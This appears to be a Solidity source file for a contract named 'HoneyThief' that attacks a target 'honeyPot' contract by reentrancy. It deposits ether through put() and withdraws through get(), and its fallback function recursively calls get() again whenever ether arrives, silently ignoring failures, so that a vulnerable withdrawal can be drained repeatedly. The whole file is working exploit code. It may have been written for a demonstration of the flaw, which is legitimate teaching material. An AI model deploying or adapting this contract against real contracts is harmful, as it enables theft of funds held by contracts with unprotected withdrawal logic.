pragma solidity 0.4.24;

contract HoneyThief {
    
    event LogFallback(address indexed sender, uint indexed value, uint newBalance);

    constructor() public {
    }

    function() external payable {
        emit LogFallback(msg.sender, msg.value, address(this).balance);
       bool success = msg.sender.call(abi.encodeWithSignature("get()", ""));

        if(!success) {
            //Eat the failure. Do not revert. 
        }
    }

    function put(address honeyPotAddress) public payable {
       address honeyPot = honeyPotAddress;
       bool success = honeyPot.call.value(msg.value)(abi.encodeWithSignature("put()", ""));
       require(success, "Call failed.");
    }

    function get(address honeyPotAddress) public {
        address honeyPot = honeyPotAddress;
        bool success = honeyPot.call(abi.encodeWithSignature("get()", ""));
        require(success, "Call failed.");
    }
}